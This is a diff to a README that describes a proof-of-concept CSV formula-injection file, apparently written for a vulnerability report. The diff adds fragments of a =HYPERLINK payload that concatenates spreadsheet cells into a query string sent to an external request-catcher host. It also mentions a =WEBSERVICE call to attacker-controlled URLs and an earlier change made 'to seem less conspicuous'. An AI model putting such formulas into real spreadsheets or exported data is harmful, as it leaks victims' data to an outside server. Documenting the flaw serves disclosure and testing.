@@ -33,8 +33,9 @@ This was a 🟦 and is now an actual picture to seem less conspicuous.
 
 Description: This file is a Proof-of-Concept for a CSV Injection (Formula Injection) vulnerability. It contains specially crafted spreadsheet formulas designed to demonstrate two potential attack vectors:
 
-Data Exfiltration/External Interaction: The =HYPERLINK formula attempts to force an outbound HTTP/S request to a controlled external server (https://deadmanxxxii.requestcatcher.com/ with commands ). This proves that arbitrary external connections can be initiated from the victim's spreadsheet, allowing for potential data exfiltration or redirection to phishing sites.
+Data Exfiltration/External Interaction: The =HYPERLINK formula attempts to force an outbound HTTP/S request to a controlled external server (https://deadmanxxxii.requestcatcher.com/ with commands ?data=\",A1)) and log?data=\"&A2&\"_\"&B2,\"Click for info\"). This proves that arbitrary external connections can be initiated from the victim's spreadsheet, allowing for potential data exfiltration or redirection to phishing sites.
 Web Service Interaction: The =WEBSERVICE formula attempts to fetch data from an external URL, similarly confirming external connectivity and potential data leakage or interaction with attacker-controlled web services.
+This if the request is made as is can be classified as an OOB attack.
 
 ### File: malicious.csv
 
